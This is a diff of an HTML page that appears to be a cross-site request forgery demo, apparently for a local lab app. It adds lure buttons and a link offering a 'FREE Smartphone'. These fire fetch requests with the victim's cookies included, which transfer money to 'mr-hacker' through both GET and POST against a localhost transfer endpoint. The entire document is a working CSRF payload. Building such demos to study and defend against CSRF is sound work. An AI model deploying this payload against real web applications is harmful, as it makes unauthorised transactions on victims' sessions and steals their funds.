@@ -16,7 +16,41 @@
 
 <body>
   <h2>Get free bonus!</h2>
-  <a href="http://127.0.0.1:8080/transfer/bartek/10000">GET HERE</a>
+  <button onclick="transferGET()">FREE Smartphone (GET)</button>
+
+  <h2>Get free bonus!</h2>
+  <button onclick="transferPOST()">FREE Smartphone (POST)</button>
+
+  <h2>Get MORE free bonus!</h2>
+  <a href="http://127.0.0.1/transfer/mr-hacker/10000">GET HERE</a>
 </body>
+
+<script>
+  function transferGET() {
+    fetch('http://127.0.0.1/transfer/mr-hacker/10000', {credentials: "include"})
+      .then((response) => {
+        return response.json();
+      })
+      .then((data) => {
+        console.log(data);
+      });
+  }
+  
+  function transferPOST() {
+    fetch('http://127.0.0.1/transfer', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: 'receiver=MrHacker&amount=100000',
+        credentials: "include"
+      })
+      .then((response) => {
+        return response.json();
+      })
+      .then((data) => {
+        console.log(data);
+      });
+  }
+  
+</script>
 
 </html>
